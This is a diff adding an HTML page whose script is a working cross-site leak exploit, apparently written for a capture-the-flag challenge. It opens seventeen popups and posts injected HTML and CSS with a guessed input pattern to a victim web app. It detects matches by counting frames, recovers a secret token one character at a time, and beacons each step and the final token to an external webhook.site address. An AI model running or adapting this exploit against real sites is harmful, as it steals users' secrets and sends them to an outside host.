@@ -1,0 +1,89 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>o</title></head><body><pre id="out"></pre>
+<script>
+const Q = new URLSearchParams(location.search);
+const K = Q.get('k') || 'https://webhook.site/63997aca-8765-4bc5-bca1-c839e891f677';
+const VICTIM = Q.get('victim') || 'http://web:3000/';
+const CHARS  = (Q.get('chars') || '0123456789abcdef').split('');
+const NLEN   = parseInt(Q.get('len') || '16', 10);
+const GATE   = parseInt(Q.get('gate') || '3000', 10);
+const NL = String.fromCharCode(10);
+const ANY = '(?:.|' + NL + ')*';       // '.' never crosses newlines; [ ] are banned upstream
+const N = CHARS.length;                // 16 candidate popups
+const CLOCK = N;                       // popup N is the timing clock (always visible)
+
+const out = document.getElementById('out');
+function say(s){ out.textContent += s + '\n'; }
+function beacon(s){ new Image().src = K + '/log?d=' + encodeURIComponent(s) + '&t=' + Date.now(); }
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function payload(guess){
+  const css  = guess === null ? 'div{display:none}' : 'div:has(input:valid){display:none}';
+  const tail = guess === null ? '' : '<input pattern="' + ANY + guess + ANY + '" value="';
+  return '<link rel=stylesheet href=/zzz.txt?{}' + css + '><div><embed code=x type=text/html>' + tail;
+}
+
+const W = [], F = [];
+for (let i = 0; i <= CLOCK; i++){
+  const n = 'p' + i;
+  W[i] = window.open('about:blank', n);
+  const f = document.createElement('form');
+  f.method='POST'; f.enctype='multipart/form-data'; f.target=n; f.style.display='none';
+  for (let j=0;j<24;j++){                      // >20 real filenames -> max_file_uploads warning
+    const inp=document.createElement('input'); inp.type='file'; inp.name='f'+j;
+    const dt=new DataTransfer(); dt.items.add(new File(['x'],'a'+j+'.txt')); inp.files=dt.files;
+    f.appendChild(inp);
+  }
+  document.body.appendChild(f);
+  F[i]=f;
+}
+const len = i => { try { return W[i].length; } catch(e){ return 'err:'+e.name; } };
+function fire(i, guess){ F[i].action = VICTIM + '?content=' + encodeURIComponent(payload(guess)); F[i].submit(); }
+
+// One round: reset every popup, fire all candidates + the clock, wait for the clock to
+// commit, then sample the candidates twice. Self-timing: no fixed sleeps.
+async function round(guesses){
+  for (let i=0;i<=CLOCK;i++){ try { W[i].location = 'about:blank'; } catch(e){} }
+  await sleep(40);
+  for (let i=0;i<N;i++) fire(i, guesses[i]);
+  fire(CLOCK, 'QQQQQQQQQQQQQQQQ');            // unmatchable -> visible -> length 1
+  const t0 = Date.now();
+  let clock = 0;
+  while (Date.now() - t0 < GATE){ clock = len(CLOCK); if (clock === 1) break; await sleep(35); }
+  await sleep(50);
+  const s1 = []; for (let i=0;i<N;i++) s1.push(len(i));
+  await sleep(90);
+  const s2 = []; for (let i=0;i<N;i++) s2.push(len(i));
+  const match = [];
+  for (let i=0;i<N;i++) if (s1[i] === 0 && s2[i] === 0) match.push(i);
+  return {clock, match};
+}
+
+(async () => {
+  const blocked = W.filter(w => !w).length;
+  beacon('START blocked=' + blocked + '/' + (CLOCK+1) + ' victim=' + VICTIM);
+  if (blocked) { beacon('ABORT popup_broken blocked=' + blocked); return; }
+
+  // Sanity: div{display:none} must hide EVERY candidate (all 0) while the clock stays 1.
+  const can = await round(new Array(N).fill(null));
+  beacon('canary clock=' + can.clock + ' matched=' + can.match.length + '/' + N);
+  if (can.clock !== 1) { beacon('ABORT no_frame_count clock=' + can.clock); return; }
+  if (can.match.length !== N) { beacon('ABORT css_incomplete matched=' + can.match.length); return; }
+  beacon('SANITY_OK');
+
+  let known = 'TOKEN_';
+  for (let pos=0; pos<NLEN; pos++){
+    const guesses = CHARS.map(c => known + c);
+    const r = await round(guesses);
+    if (r.clock !== 1) { beacon('ABORT clock_lost at ' + known); return; }
+    if (r.match.length !== 1) { beacon('AMBIGUOUS n=' + r.match.length + ' at ' + known); return; }
+    known += CHARS[r.match[0]];
+    beacon('KNOWN ' + known);
+  }
+  say('TOKEN ' + known);
+  beacon('TOKEN ' + known);
+  await sleep(200);
+  beacon('TOKEN ' + known);
+})();
+</script>
+</body></html>
